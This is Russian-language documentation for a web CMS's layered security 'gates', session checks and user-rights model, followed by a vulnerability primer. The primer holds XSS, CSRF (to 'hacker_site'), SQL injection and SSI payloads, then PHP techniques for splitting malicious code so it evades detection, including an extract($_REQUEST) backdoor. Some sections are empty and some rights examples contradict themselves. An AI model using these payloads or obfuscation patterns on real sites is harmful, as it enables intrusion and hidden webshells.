# Уровни защиты

В системе применяется несколько уровней защиты. Они следуют друг за другом. После прохождения каждого уровня система загружает следующие компоненты и переходит к следующему уровню проверки.

Такая реализация получила внутреннее название гейты безопасности, а каждый уровень защиты называется гейт.

Последовательность гейтов неизменна, т.к. она зависит от последовательности загрузки компонентов системы. Но через настройки можно выключить тот или иной гейт, тогда проверки безопасности не будет, а система загрузит очередные компоненты сразу.

1й гейт отвечает за проверку системы - это определение необходимых функций, констант, а также версии системы. Все это определяется ДО прохождения второго гейта. Но только если включен режим разработчика.

2й гейт отвечает за определение источника запроса к системе - внешний или внутренний, разрешенный или нет. Гейт отбрасывает только запрещенные внешние запросы, остальные пропускает.

3й гейт - блокировка по ip. Проверка осуществляется по черному или белому списку адресов. Поддерживаются как ip4, так и ip6, одиночные адреса и диапазоны через тире, звездочку и в формате CIDR. Для работы этого гейта подгружаются фунции обработки ip адресов.

4й гейт - проверка на вызов ошибки. Если сайт был загружен с данными об ошибке, то система ведет ее обработку, а затем перенаправляет на шаблон. Никакие другие функции и данные не загружаются.

Если вы хотите использовать какие-либо функции или объекты в шаблоне ошибки, вы можете загрузить их с помощью системной функцией init().

5й гейт встроен в обработчик путей. Если путь не соответствует определенным требованиям (это как системные условия, так и пользовательские настройки), то система перезагружается с обработанным правильным путем, либо вызывает ошибку. В ряде случаев она перенаправляет на доп.обработчик, но это касается служебного динамического контента.

6й гейт устанавливает и проверяет куки и сессию.

Между 6м и 7м гейтами идет загрузка множества компонентов, но все они необходимы, т.к. далее следует работа с базой данных.

7й гейт осуществляет проверку пользователя по базе данных с назначением ему прав.

Фактически на этом инициализация системы считается завершенной и система переходит непосредственно к загрузке сайта.

8й гейт проверяет запрос к административной части сайта

9й гейт осуществляет проверку запросов и перенаправление на процессор. Также, если пользователь получил определенные права, активируется разрешение на запись в базу данных.

После успешного прохождения 9го гейта загрузка разделяется на три варианта:

	- если процесс конечный, то он выполняется и дальнейшая загрузка сайта прекращается
	- если процесс не конечный, то он выполняется, а затем следует дальнейшая загрузка сайта
	- если не было запросов, то процессы не грузятся, а идет дальнейшая загрузка сайта

Дальнейшная загрузка подразумевает инициализацию оставшихся компонентов системы. В первую очередь, это разбор структуры и пути (роутинг).

10й и последний гейт обрабатывает путь запроса на соответствие его структуре. Он отсекает несуществующие в структуре пути.

После прохождения данного гейта следует загрузка шаблонов, модулей и библиотек, различных классов и функций.

# Принцип проверки пользователя

Когда пользователь заполняет форму авторизации/регистрации, его браузер отправляет серверу запрос.

Сервер принимает этот запрос и начинает проходить гейты. 6й гейт его пропускает, потому что на тот момент пользователю еще не назначены идентификационные куки.

В результате сервер пропускает пользователя до процессора, который приступает к обработке запроса авторизации/регистрации.

Если запрос завершился успешно, стартует сессия, пользователь получает куки и сервер перезапускает систему.

Здесь есть еще один важный момент. При авторизации/регистрации пользователя сессии назначается специальный триггер 'secure', который условно показывает, что сессия была начата.

При новом запуске уже никакого запроса нет, но есть идентификационные куки. 6й гейт останавливает пользователя и начинает проверку кук, идентификатора сессии и триггера.

Если либо идентификатора, либо кук нет, или они поддельные, система выдает ошибку. Здесь также проверяется источник запроса, т.к. этот запрос должен поступать только от системы.

Если время сессии вышло, то все идентификаторы обновляются. Однако при этом проверяется триггер 'secure', и если он не установлен, то сессия закрывается, все ее данные и куки удаляются, а система выдает ошибку. Дело в том, что триггер 'secure' записывается не в куки, а в сессию и его практически невозможно подделать.

Однако теоретически остается возможность перехватить сессию - если будут похищены куки и выполнение запроса будет происходить с того же ip-адреса и с того же браузера. Однако при этом похитителю сложно будет выполнять запросы, т.к. их источник тоже нужно будет подделать.

Если же кто-то попытается похитить сессию и допустит ошибку, сессия будет сброшена, атакуемого выкинет из аккаунта, а необходимая служебная информация запишется в логи.

На случай большей безопасности, вы можете включить дополнительную защиту от CSRF в 9-м гейте.

Однако защита CSRF срабатывает только в том случае, когда в системе назначены пользователи. Дело в том, что она работает с сессиями, а сессии стартуются только при идентификации пользователя.

Если у вас на сайте пользователи отключены или они включены, но только ради администрирования, можно предположить, что это очень простой сайт, вроде landing page или визитки, либо более сложный по структуре сайт. Но ваш сайт почти не подразумевает выполнение небезопасных запросов в систему, максимум - отправление писем через форму обратной связи. Соответственно, речь о CSRF-атаках не идет.

Однако при всем при этом остается мощная базовая защита - от спама, от xss, от ботов, блокировка по ip. Плюс сама система построена таким образом, что первые гейты позволят блокировать даже серьезные ddos атаки без значительной нагрузки на сервер.

# Информация о пользователе

Так, у пользователя есть следующая информация:

	id, name, type, data

Вся остальная информация хранится в данных (data). Какая именно информация будет записана для пользователя, настраивается системой. Для этого используется таблица "userstable", где указаны поля и формат каждого поля.

Например:

	"login" : {
		"type" : "",
		"validation" : "",
		"unique" : true,
		"required" : true,
		"authorise" : true,
		"secure" : true,
		"crypt" : false,
		"readonly" : true
	}

Эта запись идентична такой записи в таблице:

	id | name  | type | parent | ctime | mtime | self | data
	0    login                                          { "type" : "", "validation" : "", "unique" : true, "required" : true, "authorise" : true, "secure" : true, "crypt" : false, "readonly" : true }

Значит, у пользователя в данных должно быть поле "login", оно обязательное, уникальное (т.е. не повторяющаяся у других), его тип - по-умолчанию, без проверки, оно используется для авторизации, оно защищено, не закриптовано и только для чтения

Таким образом можно задать целое множество полей, любых каких нужно.

Дополнительные системные поля:

	ctime - дата создания, в абсолютном формате
	mtime - дата последнего изменения, в абсолютном формате
	self - список допустимых пользователей
	parent - список родителей

/parent/id.name.type.self[.ext] + create_time + modify_time + data

# Права пользователей и группы прав

Права пользователей назначаются по группам. Т.е. сначала вам нужно создать группу с определенными правами. Если вы хотите каждому пользователю создать индивидуальные права, вам придется создать свою группу для каждого. Хотя это, скорее всего, не потребуется, потому что права имеют гибкие настройки.

Для пользователя группа прав задается в параметре type. Одному пользователю чисто теоретически может быть назначено несколько групп, хотя практически это не имеет смысла. По крайней мере, на данный момент система в таком случае выставит права по-умолчанию, либо запретит доступ к сайту с предупреждением о том, что в такой группы прав не существует.

Для всех пользователей одной группы действуют одинаковые права. Права по-умолчанию берутся из константы DEFAULT_RIGHTS. Эти права будут применяться ко всем пользователям, для которых не назначена группа или назначенной группы не существует, или в правах группы нет правил для какой-либо таблицы.

Права состоят из правил доступа к определенной таблице (разделу) в базе данных и действию с этой таблицей.

Действия могут быть следующими:

	read - чтение информации из таблицы
	write - изменение существующей информации в таблице
	add - добавление новой записи в таблицу
	delete - удаление существующей записи в таблице

Правила группируются по следующим видам:

	allow - задает права доступа к таблице для всех пользователей
	deny - задает дополнительные запрещения, по-сути исключения из вышеизложенных прав, учитывается только когда allow = false
	self - задает права доступа к тем записям, которые принадлежат пользователю
	exclude - задает дополнительные запрещения к предыдущим правам, по-сути исключения из вышеизложенных прав, учитывается только когда self = false

Каждый из этих видов правил может принимать несколько значений.

Самые простые значения:

	true - включить (разрешить все)
	false - выключить (запретить все)

Однако можно также задать доступ отдельно:

	name - доступ к определенным записям, массив имен или true/false, если доступ ко всем
	type - доступ к записям с определенными типами, массив типов или true/false, если доступ ко всем
	parent - доступ к записям с определенными родителями, массив родителей или true/false, если доступ ко всем
	fields - доступ к определенным полям данных в записях, массив полей или true/false, если доступ ко всем

Обратите внимание, что в данном случае true/false одинаково разрешает доступ ко всем. Запрещать в данном случае не имеет смысла, т.к. запрещение доступа к любой из перечисленных частей, а также пропуск любой части автоматически запрещает доступ ко всем записям.

Например, В ТАКОМ случае эти записи БЫЛИ БЫ равнозначными:

	'allow:{names:false,types:true,parents:true,parents:true}'
	'allow:{names:false,types:false,parents:false,parents:false}'
	'allow:{types:true,parents:true,parents:true}'
	'allow:{}'
	'allow:false'

Однако, благодаря тому что ЗДЕСЬ true = false, эти записи НЕ ЯВЛЯЮТСЯ равнозначными.

# Идентификация

Есть несколько идентификаторов, по которым определяется пользователь.

UID - это user id
SID - session id
PID - (новый!) process id

Последний нужен при включении защиты процессов от бесконечных попыток для определения пользователя по косвенным параметрам: ip и user-agent. Если они пустые, то PID не создается.

Если PID отсутствует в защищенном процессе, то данный процесс не обрабатывается, а в логах записывается предупреждение.

PID передается через куки.

# Уровни защиты

Высокая безопасность подразумевает множественные проверки, что снижает скорость загрузки сайта и повышает нагрузку на сервер.

Тем более, что проверяться будет каждое обращение, каждый запрос, загрузка каждой страницы.

Поэтому в системе установлено несколько уровней защиты.

# Обычный уровень защиты

Здесь считается, что 

# Параноидальный уровень защиты

# Уровень защиты от DDOS-атак и при DDOS-атаках

# Блокировка по ip

Специальная секция блокировки ip в конфигурационных файлах сервера

Файл blacklist или blockip со списком заблокированных адресов в папке admin - их обрабатывает система, что в ряде случаев является лучшим вариантом, т.к. сервер почему-то не всегда справляется с блокировкой, особенно если идет блокировка по диапазону

# Сервисы для проверки:

Sucuri SiteCheck https://sitecheck.sucuri.net/
Google Safe Browsing https://transparencyreport.google.com/safe-browsing/search
Quttera http://quttera.com/
Web Inspector https://www.webinspector.com/
urlquery URL Scanner https://urlquery.net/
Norton Safe Web https://safeweb.norton.com/
VirusTotal https://www.virustotal.com/

Malware Domain List
PhishTank
Comodo

XSS (Cross-Site Scripting) - это вид уязвимости программного обеспечения (Web приложений), при которой, на генерированной сервером странице, выполняются вредоносные скрипты, с целью атаки клиента.
XSRF / CSRF (Request Forgery) - это вид уязвимости, позволяющий использовать недостатки HTTP протокола, при этом злоумышленники работают по следующей схеме: ссылка на вредоносный сайт установливается на странице, пользующейся доверием у пользователя, при переходе по вредоносной ссылке выполняется скрипт, сохраняющий личные данные пользователя (пароли, платежные данные и т.д.), либо отправляющий СПАМ сообщения от лица пользователя, либо изменяет доступ к учетной записи пользователя, для получения полного контроля над ней.
Code injections (SQL, PHP, ASP и т.д.) - это вид уязвимости, при котором становится возможно осуществить запуск исполняемого кода с целью получения доступа к системным ресурсам, несанкционированного доступа к данным либо выведения системы из строя.
Server-Side Includes (SSI) Injection - это вид уязвимости, использующий вставку серверных команд в HTML код или запуск их напрямую с сервера.
Authorization Bypass - это вид уязвимости, при котором возможно получить несанкционированный доступ к учетной записи или документам другого пользователя

# XSS

<script>alert(document.cookie);</script>
<script>window.parent.location.href='http://hacker_site';</script>
<object type="text/x-scriptlet" data="http://hacker_site"></object>

# XSRF / CSRF (Request Forgery)

Наиболее частыми CSRF атаками являются атаки использующие HTML <IMG> тэг или Javascript объект image. Чаще всего атакующий добавляет необходимый код в электронное письмо или выкладывает на веб-сайт, таким образом, что при загрузке страницы осуществляется запрос, выполняющий вредоносный код. Примеры:

IMG SRC
<img src="http://hacker_site/?command">

SCRIPT SRC
<script src="http://hacker_site/?command">

Javascript объект Image
<script>
           var foo = new Image();
           foo.src = "http://hacker_site/?command";
</script>

# Code injections (SQL, PHP, ASP и т.д.)

Вставки исполняемого кода рассмотрим на примере кода SQL. Форма входа в систему имеет 2 поля - имя и пароль. Обработка происходит в базе данных через выполнение SQL запроса:

SELECT Username
FROM Users
WHERE Name = 'tester'
AND Password = 'testpass';

Вводим корректное имя ’tester’, а в поле пароль вводим строку:

testpass' OR '1'='1

В итоге, Если поле не имеет соответствующих валидаций или обработчиков данных, может вскрыться уязвимость, позволяющая зайти в защищенную паролем систему, т.к.SQL запрос примет следующий вид:

SELECT Username
FROM Users
WHERE Name = 'tester'
AND Password = 'testpass' OR '1'='1';

Условие '1'='1' всегда будет истинным и поэтому SQL запрос всегда будет возвращать много значений.

# Server-Side Includes (SSI) Injection

В зависимости от типа операционной системы команды могут быть разными, как пример рассмотрим команду, которая выводит на экран список файлов в OS Linux:

< !--#exec cmd="ls" -->

# Authorization Bypass

Пользователь А может получить доступ к документам пользователя Б. Допустим, есть реализация, где при просмотре своего профиля, содержащего конфеденциальную информацию, в URL страницы передается userID, а данном случае есть смысл попробовать подставить вместо своего userID номер другого пользователя. И если вы увидите его данные, значит вы нашли дефект.



# Несколько вариантов защиты от CSRF-атак

https://learn.javascript.ru/csrf
https://habr.com/ru/post/318748/

CSRF (Cross-Site Request Forgery, также XSRF) – опаснейшая атака, которая приводит к тому, что хакер может выполнить на неподготовленном сайте массу различных действий от имени других, зарегистрированных посетителей.

Причина CSRF кроется в том, что браузеры не понимают, как различить, было ли действие явно совершено пользователем (как, скажем, нажатие кнопки на форме или переход по ссылке) или пользователь неумышленно выполнил это действие (например, при посещении bad.com, ресурсом был отправлен запрос на good.com/some_action, в то время как пользователь уже был залогинен на good.com).



# Несколько вариантов вывода вредоносного кода по-кускам, так чтобы отдельные куски невозможно было идентифицировать как вредоносный код.

# Вариант 1: косвенный вызов функции

<?php 
    $a = "var_dump";
    $b = "Test";
    $a($b);
?>

# Вариант 2: выполнение кода через eval

<?php
  eval('$a = "Test"; echo $a;');
?>

# Вариант 3: выполнение кода через assert

<?php
  assert('print("Test")');
?>

# Вариант 4: выполнение кода через array_map

<?php
  function evil($a) {
    echo $a;
  }
  array_map('evil', array("Test"));
?>

# Вариант 5: выполнение кода через preg_replace('/.*/e')

<?php
  preg_replace('/.*/e', 'print("Test")', '');
?>

# Вариант 6: выполнение кода через preg_replace_callback

<?php
  $a = function () { echo "Test"; };
  preg_replace_callback('/.*/', $a, ''); 
?>

# Вариант 7: выполнение кода через usort, uasort, uksort

<?php
  $a = function ($x, $y) { echo "Test"; };
  $b = array(1 => '1', 2 => '2');
  usort( $b, $a);
?>

# Вариант 8: скрытое объявление функций и передача параметров через extract

<?php
   extract($_REQUEST);
   $a($b);
?>

